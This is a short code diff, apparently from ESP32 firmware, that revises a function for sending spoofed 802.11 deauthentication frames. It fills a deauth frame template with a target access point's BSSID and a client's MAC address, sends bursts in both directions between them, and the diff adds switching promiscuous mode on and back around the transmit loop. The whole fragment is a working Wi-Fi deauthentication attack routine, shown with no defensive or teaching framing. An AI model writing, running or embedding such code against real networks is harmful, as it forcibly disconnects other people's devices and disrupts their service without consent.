@@ -24,7 +24,7 @@ bool parseMac(const String& s, uint8_t out[6]) {
 // 802.11 deauth frame template (reason 7 = class-3 frame from nonassociated STA).
 // [0..1] frame control (0xC0 = deauth), [2..3] duration, [4..9] addr1=dst,
 // [10..15] addr2=src, [16..21] addr3=bssid, [22..23] seq, [24..25] reason.
-static uint8_t TMPL[26] = {
+static const uint8_t TMPL[26] = {
   0xC0, 0x00, 0x00, 0x00,
   0,0,0,0,0,0,  0,0,0,0,0,0,  0,0,0,0,0,0,
   0x00, 0x00, 0x07, 0x00,
@@ -41,6 +41,9 @@ static void fill(uint8_t* f, const uint8_t dst[6], const uint8_t src[6],
 int deauth(const uint8_t bssid[6], const uint8_t client[6], uint8_t channel,
            int bursts) {
   esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  bool wasProm = false;
+  esp_wifi_get_promiscuous(&wasProm);
+  esp_wifi_set_promiscuous(true);
   uint8_t ap2cl[26], cl2ap[26];
   fill(ap2cl, client, bssid, bssid);   // AP -> client
   fill(cl2ap, bssid, client, bssid);   // client -> AP
@@ -50,6 +53,7 @@ int deauth(const uint8_t bssid[6], const uint8_t client[6], uint8_t channel,
     if (esp_wifi_80211_tx(WIFI_IF_STA, cl2ap, sizeof cl2ap, false) == ESP_OK) sent++;
     delay(2);
   }
+  esp_wifi_set_promiscuous(wasProm);
   return sent;
 }
 
